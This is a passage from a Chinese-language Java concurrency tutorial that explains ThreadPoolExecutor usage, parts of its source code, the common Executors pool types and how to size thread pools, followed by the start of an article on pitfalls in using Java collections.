来回顾上面的内容。\n4.1 示例代码:Runnable+ThreadPoolExecutor    首先创建一个 Runnable 接口的实现类（当然也可以是 Callable 接口，我们上面也说了两者的区别。）\nMyRunnable.java\nimport java.util.Date; /** * 这是一个简单的Runnable类，需要大约5秒钟来执行其任务。 * @author shuang.kou */ public class MyRunnable implements Runnable { private String command; public MyRunnable(String s) { this.command = s; } @Override public void run() { System.out.println(Thread.currentThread().getName() + \u0026#34; Start. Time = \u0026#34; + new Date()); processCommand(); System.out.println(Thread.currentThread().getName() + \u0026#34; End. Time = \u0026#34; + new Date()); } private void processCommand() { try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } } @Override public String toString() { return this.command; } } 编写测试程序，我们这里以阿里巴巴推荐的使用 ThreadPoolExecutor 构造函数自定义参数的方式来创建线程池。\nThreadPoolExecutorDemo.java\nimport java.util.concurrent.ArrayBlockingQueue; import java.util.concurrent.ThreadPoolExecutor; import java.util.concurrent.TimeUnit; public class ThreadPoolExecutorDemo { private static final int CORE_POOL_SIZE = 5; private static final int MAX_POOL_SIZE = 10; private static final int QUEUE_CAPACITY = 100; private static final Long KEEP_ALIVE_TIME = 1L; public static void main(String[] args) { //使用阿里巴巴推荐的创建线程池的方式  //通过ThreadPoolExecutor构造函数自定义参数创建  ThreadPoolExecutor executor = new ThreadPoolExecutor( CORE_POOL_SIZE, MAX_POOL_SIZE, KEEP_ALIVE_TIME, TimeUnit.SECONDS, new ArrayBlockingQueue\u0026lt;\u0026gt;(QUEUE_CAPACITY), new ThreadPoolExecutor.CallerRunsPolicy()); for (int i = 0; i \u0026lt; 10; i++) { //创建WorkerThread对象（WorkerThread类实现了Runnable 接口）  Runnable worker = new MyRunnable(\u0026#34;\u0026#34; + i); //执行Runnable  executor.execute(worker); } //终止线程池  executor.shutdown(); while (!executor.isTerminated()) { } System.out.println(\u0026#34;Finished all threads\u0026#34;); } } 可以看到我们上面的代码指定了：\n corePoolSize: 核心线程数为 5。 maximumPoolSize ：最大线程数 10 keepAliveTime : 等待时间为 1L。 unit: 等待时间的单位为 TimeUnit.SECONDS。 workQueue：任务队列为 ArrayBlockingQueue，并且容量为 100; handler:饱和策略为 CallerRunsPolicy。  Output：\npool-1-thread-3 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-5 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-2 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-1 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-4 Start. Time = Sun Apr 12 11:14:37 CST 2020 pool-1-thread-3 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-4 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-1 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-5 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-1 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-2 End. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-5 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-4 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-3 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-2 Start. Time = Sun Apr 12 11:14:42 CST 2020 pool-1-thread-1 End. Time = Sun Apr 12 11:14:47 CST 2020 pool-1-thread-4 End. Time = Sun Apr 12 11:14:47 CST 2020 pool-1-thread-5 End. Time = Sun Apr 12 11:14:47 CST 2020 pool-1-thread-3 End. Time = Sun Apr 12 11:14:47 CST 2020 pool-1-thread-2 End. Time = Sun Apr 12 11:14:47 CST 2020 4.2 线程池原理分析    承接 4.1 节，我们通过代码输出结果可以看出：线程池首先会先执行 5 个任务，然后这些任务有任务被执行完的话，就会去拿新的任务执行。 大家可以先通过上面讲解的内容，分析一下到底是咋回事？（自己独立思考一会）\n现在，我们就分析上面的输出内容来简单分析一下线程池原理。\n为了搞懂线程池的原理，我们需要首先分析一下 execute方法。 在 4.1 节中的 Demo 中我们使用 executor.execute(worker)来提交一个任务到线程池中去，这个方法非常重要，下面我们来看看它的源码：\n// 存放线程池的运行状态 (runState) 和线程池内有效线程的数量 (workerCount)  private final AtomicInteger ctl = new AtomicInteger(ctlOf(RUNNING, 0)); private static int workerCountOf(int c) { return c \u0026amp; CAPACITY; } //任务队列  private final BlockingQueue\u0026lt;Runnable\u0026gt; workQueue; public void execute(Runnable command) { // 如果任务为null，则抛出异常。  if (command == null) throw new NullPointerException(); // ctl 中保存的线程池当前的一些状态信息  int c = ctl.get(); // 下面会涉及到 3 步 操作  // 1.首先判断当前线程池中之行的任务数量是否小于 corePoolSize  // 如果小于的话，通过addWorker(command, true)新建一个线程，并将任务(command)添加到该线程中；然后，启动该线程从而执行任务。  if (workerCountOf(c) \u0026lt; corePoolSize) { if (addWorker(command, true)) return; c = ctl.get(); } // 2.如果当前之行的任务数量大于等于 corePoolSize 的时候就会走到这里  // 通过 isRunning 方法判断线程池状态，线程池处于 RUNNING 状态才会被并且队列可以加入任务，该任务才会被加入进去  if (isRunning(c) \u0026amp;\u0026amp; workQueue.offer(command)) { int recheck = ctl.get(); // 再次获取线程池状态，如果线程池状态不是 RUNNING 状态就需要从任务队列中移除任务，并尝试判断线程是否全部执行完毕。同时执行拒绝策略。  if (!isRunning(recheck) \u0026amp;\u0026amp; remove(command)) reject(command); // 如果当前线程池为空就新创建一个线程并执行。  else if (workerCountOf(recheck) == 0) addWorker(null, false); } //3. 通过addWorker(command, false)新建一个线程，并将任务(command)添加到该线程中；然后，启动该线程从而执行任务。  //如果addWorker(command, false)执行失败，则通过reject()执行相应的拒绝策略的内容。  else if (!addWorker(command, false)) reject(command); } 通过下图可以更好的对上面这 3 步做一个展示，下图是我为了省事直接从网上找到，原地址不明。\naddWorker 这个方法主要用来创建新的工作线程，如果返回 true 说明创建和启动工作线程成功，否则的话返回的就是 false。\n// 全局锁，并发操作必备  private final ReentrantLock mainLock = new ReentrantLock(); // 跟踪线程池的最大大小，只有在持有全局锁mainLock的前提下才能访问此集合  private int largestPoolSize; // 工作线程集合，存放线程池中所有的（活跃的）工作线程，只有在持有全局锁mainLock的前提下才能访问此集合  private final HashSet\u0026lt;Worker\u0026gt; workers = new HashSet\u0026lt;\u0026gt;(); //获取线程池状态  private static int runStateOf(int c) { return c \u0026amp; ~CAPACITY; } //判断线程池的状态是否为 Running  private static boolean isRunning(int c) { return c \u0026lt; SHUTDOWN; } /** * 添加新的工作线程到线程池 * @param firstTask 要执行 * @param core参数为true的话表示使用线程池的基本大小，为false使用线程池最大大小 * @return 添加成功就返回true否则返回false */ private boolean addWorker(Runnable firstTask, boolean core) { retry: for (;;) { //这两句用来获取线程池的状态  int c = ctl.get(); int rs = runStateOf(c); // Check if queue empty only if necessary.  if (rs \u0026gt;= SHUTDOWN \u0026amp;\u0026amp; ! (rs == SHUTDOWN \u0026amp;\u0026amp; firstTask == null \u0026amp;\u0026amp; ! workQueue.isEmpty())) return false; for (;;) { //获取线程池中线程的数量  int wc = workerCountOf(c); // core参数为true的话表明队列也满了，线程池大小变为 maximumPoolSize  if (wc \u0026gt;= CAPACITY || wc \u0026gt;= (core ? corePoolSize : maximumPoolSize)) return false; //原子操作将workcount的数量加1  if (compareAndIncrementWorkerCount(c)) break retry; // 如果线程的状态改变了就再次执行上述操作  c = ctl.get(); if (runStateOf(c) != rs) continue retry; // else CAS failed due to workerCount change; retry inner loop  } } // 标记工作线程是否启动成功  boolean workerStarted = false; // 标记工作线程是否创建成功  boolean workerAdded = false; Worker w = null; try { w = new Worker(firstTask); final Thread t = w.thread; if (t != null) { // 加锁  final ReentrantLock mainLock = this.mainLock; mainLock.lock(); try { //获取线程池状态  int rs = runStateOf(ctl.get()); //rs \u0026lt; SHUTDOWN 如果线程池状态依然为RUNNING,并且线程的状态是存活的话，就会将工作线程添加到工作线程集合中  //(rs=SHUTDOWN \u0026amp;\u0026amp; firstTask == null)如果线程池状态小于STOP，也就是RUNNING或者SHUTDOWN状态下，同时传入的任务实例firstTask为null，则需要添加到工作线程集合和启动新的Worker  // firstTask == null证明只新建线程而不执行任务  if (rs \u0026lt; SHUTDOWN || (rs == SHUTDOWN \u0026amp;\u0026amp; firstTask == null)) { if (t.isAlive()) // precheck that t is startable  throw new IllegalThreadStateException(); workers.add(w); //更新当前工作线程的最大容量  int s = workers.size(); if (s \u0026gt; largestPoolSize) largestPoolSize = s; // 工作线程是否启动成功  workerAdded = true; } } finally { // 释放锁  mainLock.unlock(); } //// 如果成功添加工作线程，则调用Worker内部的线程实例t的Thread#start()方法启动真实的线程实例  if (workerAdded) { t.start(); /// 标记线程启动成功  workerStarted = true; } } } finally { // 线程启动失败，需要从工作线程中移除对应的Worker  if (! workerStarted) addWorkerFailed(w); } return workerStarted; } 更多关于线程池源码分析的内容推荐这篇文章：《JUC 线程池 ThreadPoolExecutor 源码分析》\n现在，让我们在回到 4.1 节我们写的 Demo， 现在应该是不是很容易就可以搞懂它的原理了呢？\n没搞懂的话，也没关系，可以看看我的分析：\n 我们在代码中模拟了 10 个任务，我们配置的核心线程数为 5 、等待队列容量为 100 ，所以每次只可能存在 5 个任务同时执行，剩下的 5 个任务会被放到等待队列中去。当前的 5 个任务中如果有任务被执行完了，线程池就会去拿新的任务执行。\n 4.3 几个常见的对比    4.3.1 Runnable vs Callable    Runnable自 Java 1.0 以来一直存在，但Callable仅在 Java 1.5 中引入,目的就是为了来处理Runnable不支持的用例。Runnable 接口不会返回结果或抛出检查异常，但是 Callable 接口可以。所以，如果任务不需要返回结果或抛出异常推荐使用 Runnable 接口，这样代码看起来会更加简洁。\n工具类 Executors 可以实现将 Runnable 对象转换成 Callable 对象。（Executors.callable(Runnable task) 或 Executors.callable(Runnable task, Object result)）。\nRunnable.java\n@FunctionalInterface public interface Runnable { /** * 被线程执行，没有返回值也无法抛出异常 */ public abstract void run(); } Callable.java\n@FunctionalInterface public interface Callable\u0026lt;V\u0026gt; { /** * 计算结果，或在无法这样做时抛出异常。 * @return 计算得出的结果 * @throws 如果无法计算结果，则抛出异常 */ V call() throws Exception; } 4.3.2 execute() vs submit()     execute()方法用于提交不需要返回值的任务，所以无法判断任务是否被线程池执行成功与否； submit()方法用于提交需要返回值的任务。线程池会返回一个 Future 类型的对象，通过这个 Future 对象可以判断任务是否执行成功，并且可以通过 Future 的 get()方法来获取返回值，get()方法会阻塞当前线程直到任务完成，而使用 get（long timeout，TimeUnit unit）方法则会阻塞当前线程一段时间后立即返回，这时候有可能任务没有执行完。  我们以 AbstractExecutorService 接口中的一个 submit() 方法为例子来看看源代码：\npublic Future\u0026lt;?\u0026gt; submit(Runnable task) { if (task == null) throw new NullPointerException(); RunnableFuture\u0026lt;Void\u0026gt; ftask = newTaskFor(task, null); execute(ftask); return ftask; } 上面方法调用的 newTaskFor 方法返回了一个 FutureTask 对象。\nprotected \u0026lt;T\u0026gt; RunnableFuture\u0026lt;T\u0026gt; newTaskFor(Runnable runnable, T value) { return new FutureTask\u0026lt;T\u0026gt;(runnable, value); } 我们再来看看execute()方法：\npublic void execute(Runnable command) { ... } 4.3.3 shutdown()VSshutdownNow()     shutdown（） :关闭线程池，线程池的状态变为 SHUTDOWN。线程池不再接受新任务了，但是队列里的任务得执行完毕。 shutdownNow（） :关闭线程池，线程的状态变为 STOP。线程池会终止当前正在运行的任务，并停止处理排队的任务并返回正在等待执行的 List。  4.3.2 isTerminated() VS isShutdown()     isShutDown 当调用 shutdown() 方法后返回为 true。 isTerminated 当调用 shutdown() 方法后，并且所有提交的任务完成后返回为 true  4.4 加餐:Callable+ThreadPoolExecutor示例代码    MyCallable.java\nimport java.util.concurrent.Callable; public class MyCallable implements Callable\u0026lt;String\u0026gt; { @Override public String call() throws Exception { Thread.sleep(1000); //返回执行当前 Callable 的线程名字  return Thread.currentThread().getName(); } } CallableDemo.java\nimport java.util.ArrayList; import java.util.Date; import java.util.List; import java.util.concurrent.ArrayBlockingQueue; import java.util.concurrent.Callable; import java.util.concurrent.ExecutionException; import java.util.concurrent.Future; import java.util.concurrent.ThreadPoolExecutor; import java.util.concurrent.TimeUnit; public class CallableDemo { private static final int CORE_POOL_SIZE = 5; private static final int MAX_POOL_SIZE = 10; private static final int QUEUE_CAPACITY = 100; private static final Long KEEP_ALIVE_TIME = 1L; public static void main(String[] args) { //使用阿里巴巴推荐的创建线程池的方式  //通过ThreadPoolExecutor构造函数自定义参数创建  ThreadPoolExecutor executor = new ThreadPoolExecutor( CORE_POOL_SIZE, MAX_POOL_SIZE, KEEP_ALIVE_TIME, TimeUnit.SECONDS, new ArrayBlockingQueue\u0026lt;\u0026gt;(QUEUE_CAPACITY), new ThreadPoolExecutor.CallerRunsPolicy()); List\u0026lt;Future\u0026lt;String\u0026gt;\u0026gt; futureList = new ArrayList\u0026lt;\u0026gt;(); Callable\u0026lt;String\u0026gt; callable = new MyCallable(); for (int i = 0; i \u0026lt; 10; i++) { //提交任务到线程池  Future\u0026lt;String\u0026gt; future = executor.submit(callable); //将返回值 future 添加到 list，我们可以通过 future 获得 执行 Callable 得到的返回值  futureList.add(future); } for (Future\u0026lt;String\u0026gt; fut : futureList) { try { System.out.println(new Date() + \u0026#34;::\u0026#34; + fut.get()); } catch (InterruptedException | ExecutionException e) { e.printStackTrace(); } } //关闭线程池  executor.shutdown(); } } Output:\nWed Nov 13 13:40:41 CST 2019::pool-1-thread-1 Wed Nov 13 13:40:42 CST 2019::pool-1-thread-2 Wed Nov 13 13:40:42 CST 2019::pool-1-thread-3 Wed Nov 13 13:40:42 CST 2019::pool-1-thread-4 Wed Nov 13 13:40:42 CST 2019::pool-1-thread-5 Wed Nov 13 13:40:42 CST 2019::pool-1-thread-3 Wed Nov 13 13:40:43 CST 2019::pool-1-thread-2 Wed Nov 13 13:40:43 CST 2019::pool-1-thread-1 Wed Nov 13 13:40:43 CST 2019::pool-1-thread-4 Wed Nov 13 13:40:43 CST 2019::pool-1-thread-5 五 几种常见的线程池详解    5.1 FixedThreadPool    5.1.1 介绍    FixedThreadPool 被称为可重用固定线程数的线程池。通过 Executors 类中的相关源代码来看一下相关实现：\n/** * 创建一个可重用固定数量线程的线程池 */ public static ExecutorService newFixedThreadPool(int nThreads, ThreadFactory threadFactory) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;(), threadFactory); } 另外还有一个 FixedThreadPool 的实现方法，和上面的类似，所以这里不多做阐述：\npublic static ExecutorService newFixedThreadPool(int nThreads) { return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;()); } 从上面源代码可以看出新创建的 FixedThreadPool 的 corePoolSize 和 maximumPoolSize 都被设置为 nThreads，这个 nThreads 参数是我们使用的时候自己传递的。\n5.1.2 执行任务过程介绍    FixedThreadPool 的 execute() 方法运行示意图（该图片来源：《Java 并发编程的艺术》）：\n上图说明：\n 如果当前运行的线程数小于 corePoolSize， 如果再来新任务的话，就创建新的线程来执行任务； 当前运行的线程数等于 corePoolSize 后， 如果再来新任务的话，会将任务加入 LinkedBlockingQueue； 线程池中的线程执行完 手头的任务后，会在循环中反复从 LinkedBlockingQueue 中获取任务来执行；  5.1.3 为什么不推荐使用FixedThreadPool？    FixedThreadPool 使用无界队列 LinkedBlockingQueue（队列的容量为 Integer.MAX_VALUE）作为线程池的工作队列会对线程池带来如下影响 ：\n 当线程池中的线程数达到 corePoolSize 后，新任务将在无界队列中等待，因此线程池中的线程数不会超过 corePoolSize； 由于使用无界队列时 maximumPoolSize 将是一个无效参数，因为不可能存在任务队列满的情况。所以，通过创建 FixedThreadPool的源码可以看出创建的 FixedThreadPool 的 corePoolSize 和 maximumPoolSize 被设置为同一个值。 由于 1 和 2，使用无界队列时 keepAliveTime 将是一个无效参数； 运行中的 FixedThreadPool（未执行 shutdown()或 shutdownNow()）不会拒绝任务，在任务比较多的时候会导致 OOM（内存溢出）。  5.2 SingleThreadExecutor 详解    5.2.1 介绍    SingleThreadExecutor 是只有一个线程的线程池。下面看看SingleThreadExecutor 的实现：\n/** *返回只有一个线程的线程池 */ public static ExecutorService newSingleThreadExecutor(ThreadFactory threadFactory) { return new FinalizableDelegatedExecutorService (new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;(), threadFactory)); } public static ExecutorService newSingleThreadExecutor() { return new FinalizableDelegatedExecutorService (new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue\u0026lt;Runnable\u0026gt;())); } 从上面源代码可以看出新创建的 SingleThreadExecutor 的 corePoolSize 和 maximumPoolSize 都被设置为 1.其他参数和 FixedThreadPool 相同。\n5.2.2 执行任务过程介绍    SingleThreadExecutor 的运行示意图（该图片来源：《Java 并发编程的艺术》）： 上图说明 :\n 如果当前运行的线程数少于 corePoolSize，则创建一个新的线程执行任务； 当前线程池中有一个运行的线程后，将任务加入 LinkedBlockingQueue 线程执行完当前的任务后，会在循环中反复从LinkedBlockingQueue 中获取任务来执行；  5.2.3 为什么不推荐使用SingleThreadExecutor？    SingleThreadExecutor 使用无界队列 LinkedBlockingQueue 作为线程池的工作队列（队列的容量为 Intger.MAX_VALUE）。SingleThreadExecutor 使用无界队列作为线程池的工作队列会对线程池带来的影响与 FixedThreadPool 相同。说简单点就是可能会导致 OOM，\n5.3 CachedThreadPool 详解    5.3.1 介绍    CachedThreadPool 是一个会根据需要创建新线程的线程池。下面通过源码来看看 CachedThreadPool 的实现：\n/** * 创建一个线程池，根据需要创建新线程，但会在先前构建的线程可用时重用它。 */ public static ExecutorService newCachedThreadPool(ThreadFactory threadFactory) { return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue\u0026lt;Runnable\u0026gt;(), threadFactory); } public static ExecutorService newCachedThreadPool() { return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue\u0026lt;Runnable\u0026gt;()); } CachedThreadPool 的corePoolSize 被设置为空（0），maximumPoolSize被设置为 Integer.MAX.VALUE，即它是无界的，这也就意味着如果主线程提交任务的速度高于 maximumPool 中线程处理任务的速度时，CachedThreadPool 会不断创建新的线程。极端情况下，这样会导致耗尽 cpu 和内存资源。\n5.3.2 执行任务过程介绍    CachedThreadPool 的 execute() 方法的执行示意图（该图片来源：《Java 并发编程的艺术》）： 上图说明：\n 首先执行 SynchronousQueue.offer(Runnable task) 提交任务到任务队列。如果当前 maximumPool 中有闲线程正在执行 SynchronousQueue.poll(keepAliveTime,TimeUnit.NANOSECONDS)，那么主线程执行 offer 操作与空闲线程执行的 poll 操作配对成功，主线程把任务交给空闲线程执行，execute()方法执行完成，否则执行下面的步骤 2； 当初始 maximumPool 为空，或者 maximumPool 中没有空闲线程时，将没有线程执行 SynchronousQueue.poll(keepAliveTime,TimeUnit.NANOSECONDS)。这种情况下，步骤 1 将失败，此时 CachedThreadPool 会创建新线程执行任务，execute 方法执行完成；  5.3.3 为什么不推荐使用CachedThreadPool？    CachedThreadPool允许创建的线程数量为 Integer.MAX_VALUE ，可能会创建大量线程，从而导致 OOM。\n六 ScheduledThreadPoolExecutor 详解    ScheduledThreadPoolExecutor 主要用来在给定的延迟后运行任务，或者定期执行任务。 这个在实际项目中基本不会被用到，也不推荐使用，大家只需要简单了解一下它的思想即可。\n6.1 简介    ScheduledThreadPoolExecutor 使用的任务队列 DelayQueue 封装了一个 PriorityQueue，PriorityQueue 会对队列中的任务进行排序，执行所需时间短的放在前面先被执行(ScheduledFutureTask 的 time 变量小的先执行)，如果执行所需时间相同则先提交的任务将被先执行(ScheduledFutureTask 的 squenceNumber 变量小的先执行)。\nScheduledThreadPoolExecutor 和 Timer 的比较：\n Timer 对系统时钟的变化敏感，ScheduledThreadPoolExecutor不是； Timer 只有一个执行线程，因此长时间运行的任务可以延迟其他任务。 ScheduledThreadPoolExecutor 可以配置任意数量的线程。 此外，如果你想（通过提供 ThreadFactory），你可以完全控制创建的线程; 在TimerTask 中抛出的运行时异常会杀死一个线程，从而导致 Timer 死机:-( \u0026hellip;即计划任务将不再运行。ScheduledThreadExecutor 不仅捕获运行时异常，还允许您在需要时处理它们（通过重写 afterExecute 方法ThreadPoolExecutor）。抛出异常的任务将被取消，但其他任务将继续运行。  综上，在 JDK1.5 之后，你没有理由再使用 Timer 进行任务调度了。\n 关于定时任务的详细介绍，小伙伴们可以在 JavaGuide 的项目首页搜索“定时任务”找到对应的原创内容。\n 6.2 运行机制    ScheduledThreadPoolExecutor 的执行主要分为两大部分：\n 当调用 ScheduledThreadPoolExecutor 的 scheduleAtFixedRate() 方法或者 scheduleWithFixedDelay() 方法时，会向 ScheduledThreadPoolExecutor 的 DelayQueue 添加一个实现了 RunnableScheduledFuture 接口的 ScheduledFutureTask 。 线程池中的线程从 DelayQueue 中获取 ScheduledFutureTask，然后执行任务。  ScheduledThreadPoolExecutor 为了实现周期性的执行任务，对 ThreadPoolExecutor做了如下修改：\n 使用 DelayQueue 作为任务队列； 获取任务的方不同 执行周期任务后，增加了额外的处理  6.3 ScheduledThreadPoolExecutor 执行周期任务的步骤     线程 1 从 DelayQueue 中获取已到期的 ScheduledFutureTask（DelayQueue.take()）。到期任务是指 ScheduledFutureTask的 time 大于等于当前系统的时间； 线程 1 执行这个 ScheduledFutureTask； 线程 1 修改 ScheduledFutureTask 的 time 变量为下次将要被执行的时间； 线程 1 把这个修改 time 之后的 ScheduledFutureTask 放回 DelayQueue 中（DelayQueue.add())。  七 线程池大小确定    线程池数量的确定一直是困扰着程序员的一个难题，大部分程序员在设定线程池大小的时候就是随心而定。\n很多人甚至可能都会觉得把线程池配置过大一点比较好！我觉得这明显是有问题的。就拿我们生活中非常常见的一例子来说：并不是人多就能把事情做好，增加了沟通交流成本。你本来一件事情只需要 3 个人做，你硬是拉来了 6 个人，会提升做事效率嘛？我想并不会。 线程数量过多的影响也是和我们分配多少人做事情一样，对于多线程这个场景来说主要是增加了上下文切换成本。不清楚什么是上下文切换的话，可以看我下面的介绍。\n 上下文切换：\n多线程编程中一般线程的个数都大于 CPU 核心的个数，而一个 CPU 核心在任意时刻只能被一个线程使用，为了让这些线程都能得到有效执行，CPU 采取的策略是为每个线程分配时间片并轮转的形式。当一个线程的时间片用完的时候就会重新处于就绪状态让给其他线程使用，这个过程就属于一次上下文切换。概括来说就是：当前任务在执行完 CPU 时间片切换到另一个任务之前会先保存自己的状态，以便下次再切换回这个任务时，可以再加载这个任务的状态。任务从保存到再加载的过程就是一次上下文切换。\n上下文切换通常是计算密集型的。也就是说，它需要相当可观的处理器时间，在每秒几十上百次的切换中，每次切换都需要纳秒量级的时间。所以，上下文切换对系统来说意味着消耗大量的 CPU 时间，事实上，可能是操作系统中时间消耗最大的操作。\nLinux 相比与其他操作系统（包括其他类 Unix 系统）有很多的优点，其中有一项就是，其上下文切换和模式切换的时间消耗非常少。\n 类比于实现世界中的人类通过合作做某件事情，我们可以肯定的一点是线程池大小设置过大或者过小都会有问题，合适的才是最好。\n如果我们设置的线程池数量太小的话，如果同一时间有大量任务/请求需要处理，可能会导致大量的请求/任务在任务队列中排队等待执行，甚至会出现任务队列满了之后任务/请求无法处理的情况，或者大量任务堆积在任务队列导致 OOM。这样很明显是有问题的！ CPU 根本没有得到充分利用。\n但是，如果我们设置线程数量太大，大量线程可能会同时在争取 CPU 资源，这样会导致大量的上下文切换，从而增加线程的执行时间，影响了整体执行效率。\n有一个简单并且适用面比较广的公式：\n CPU 密集型任务(N+1)： 这种任务消耗的主要是 CPU 资源，可以将线程数设置为 N（CPU 核心数）+1，比 CPU 核心数多出来的一个线程是为了防止线程偶发的缺页中断，或者其它原因导致的任务暂停而带来的影响。一旦任务暂停，CPU 就会处于空闲状态，而在这种情况下多出来的一个线程就可以充分利用 CPU 的空闲时间。 I/O 密集型任务(2N)： 这种任务应用起来，系统会用大部分的时间来处理 I/O 交互，而线程在处理 I/O 的时间段内不会占用 CPU 来处理，这时就可以将 CPU 交出给其它线程使用。因此在 I/O 密集型任务的应用中，我们可以多配置一些线程，具体的计算方法是 2N。  如何判断是 CPU 密集任务还是 IO 密集任务？\nCPU 密集型简单理解就是利用 CPU 计算能力的任务比如你在内存中对大量数据进行排序。但凡涉及到网络读取，文件读取这类都是 IO 密集型，这类任务的特点是 CPU 计算耗费时间相比于等待 IO 操作完成的时间来说很少，大部分时间都花在了等待 IO 操作完成上。\n八 参考     《Java 并发编程的艺术》 Java Scheduler ScheduledExecutorService ScheduledThreadPoolExecutor Example java.util.concurrent.ScheduledThreadPoolExecutor Example ThreadPoolExecutor – Java Thread Pool Example  九 其他推荐阅读     Java 并发（三）线程池原理 如何优雅的使用和理解线程池  "},{"id":232,"href":"/java/collection/Java%E9%9B%86%E5%90%88%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%E6%80%BB%E7%BB%93/","title":"Java集合使用注意事项总结","parent":"collection","content":"这篇文章我根据《阿里巴巴 Java 开发手册》总结了关于集合使用常见的注意事项以及其具体原理。\n强烈建议小伙伴们多多阅读几遍，避免自己写代码的时候出现这些低级的问题。\n集合判空    《阿里巴巴 Java 开发手册》的描述如下：\n 判断所有集合内部的元素是否为空，使用 isEmpty() 方法，而不是 size()==0 的方式。\n 这是因为 isEmpty() 方法的可读性更好，并且时间复杂度为 O(1)。\n绝大部分我们使用的集合的 size() 方法的时间复杂度也是 O(1)，不过，也有很多复杂度不是 O(1) 的，比如 java.util.concurrent 包下的某些集合（ConcurrentLinkedQueue 、ConcurrentHashMap\u0026hellip;）。\n下面是 ConcurrentHashMap 的 size() 方法和 isEmpty() 方法的源码。\npublic int size() { long n = sumCount(); return ((n \u0026lt; 0L) ? 0 : (n \u0026gt; (long)Integer.MAX_VALUE) ? Integer.MAX_VALUE : (int)n); } final long sumCount() { CounterCell[] as = counterCells; CounterCell a; long sum = baseCount; if (as != null) { for (int i = 0; i \u0026lt; as.length; ++i) { if ((a = as[i]) != null) sum += a.value; } } return sum; } public boolean isEmpty() { return sumCount() \u0026lt;= 0L; // ignore transient negative values } 集合转 Map    《阿里巴巴 Java 开发手册》的描述如下：\n 在使用 java.util.stream.Collectors 类的 toMap() 方法转为 Map 集合时，一定要注意当 value 为 null 时会抛 NPE 异常。\n class Person { private String name; private String phoneNumber; // getters and setters } List\u0026lt;Person\u0026gt; bookList = new ArrayList\u0026lt;\u0026gt;(); bookList.add(new Person(\u0026#34;jack\u0026#34;,\u0026#34;18163138123\u0026#34;)); bookList.add(new Person(\u0026#34;martin\u0026#34;,null)); // 空指针异常 bookList.stream().collect(Collectors.toMap(Person::getName, Person::getPhoneNumber)); 下面我们来解释一下原因。\n首先，我们来看 java.util.stream.Collectors 类的 toMap() 方法 ，可以看到其内部调用了 Map 接口的 merge() 方法。\npublic static \u0026lt;T, K, U, M extends Map\u0026lt;K, U\u0026gt;\u0026gt; Collector\u0026lt;T, ?, M\u0026gt; toMap(Function\u0026lt;? super T, ? extends K\u0026gt; keyMapper, Function\u0026lt;? super T, ? extends U\u0026gt; valueMapper, BinaryOperator\u0026lt;U\u0026gt; mergeFunction, Supplier\u0026lt;M\u0026gt; mapSupplier) { BiConsumer\u0026lt;M, T\u0026gt; accumulator = (map, element) -\u0026gt; map.merge(keyMapper.apply(element), valueMapper.apply(element), mergeFunction); return new CollectorImpl\u0026lt;\u0026gt;(mapSupplier, accumulator, mapMerger(mergeFunction), CH_ID); } Map 接口的 merge() 方法如下，这个方法是接口中的默认实现。\n 如果你还不了解 Java 8 新特性的话，请看这篇文章：《Java8 新特性总结》 。\n default V merge(K key, V value, BiFunction\u0026lt;? super V, ? super V, ? extends V\u0026gt; remappingFunction) { Objects.requireNonNull(remappingFunction); Objects.requireNonNull(value); V oldValue = get(key); V newValue = (oldValue == null) ? value : remappingFunction.apply(oldValue, value); if(newValue == null) { remove(key); } else { put(key, newValue); } return newValue; } merge() 方法会先调用 Objects.requireNonNull() 方法判断 value 是否为空。\npublic static \u0026lt;T\u0026gt; T requireNonNull(T obj) { if (obj == null) throw new NullPointerException(); return obj; } 集合遍历    《阿里巴巴 Java 开发手册》的描述如下：\n 不要在 foreach 循环里进行元素的 remove/add 操作。remove 元素请使用 Iterator 方式，如果并发操作，需要对 Iterator 对象加锁。\n 通过反编译你会发现 foreach 语法糖底层其实还是依赖 Iterator 。不过， remove/add 操作直接调用的是集合自己的方法，而不是 Iterator 的 remove/add方法\n这就导致 Iterator 莫名其妙地发现自己有元素被 remove/add ，然后，它就会抛出一个 ConcurrentModificationException 来提示用户发生了并发修改异常。这就是单线程状态下产生的 fail-fast 机制。\n fail-fast 机制 ：多个线程对 fail-fast 集合进行修改的时候，可能会抛出ConcurrentModificationException。 即使是单线程下也有可能会出现这种情况，上面已经提到过。\n Java8 开始，可以使用 Collection#removeIf()方法删除满足特定条件的元素,如\nList\u0026lt;Integer\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); for (int i = 1; i \u0026lt;= 10; ++i) { list.add(i); } list.removeIf(filter -\u0026gt; filter % 2 == 0); /* 删除list中的所有偶数 */ System.out.println(list); /* [1, 3, 5, 7, 9] */ 除了上面介绍的直接使用 Iterator 进行遍历操作之外，你还可以：\n 使用普通的 for 循环 使用 fail-safe 的集合类。java.util包下面的所有的集合类都是 fail-fast 的，而java.util.concurrent包下面的所有的类都是 fail-safe 的。 \u0026hellip;\u0026hellip;  集合去重    《阿里巴巴 Java 开发手册》的描述如下：\n 可以利用 Set 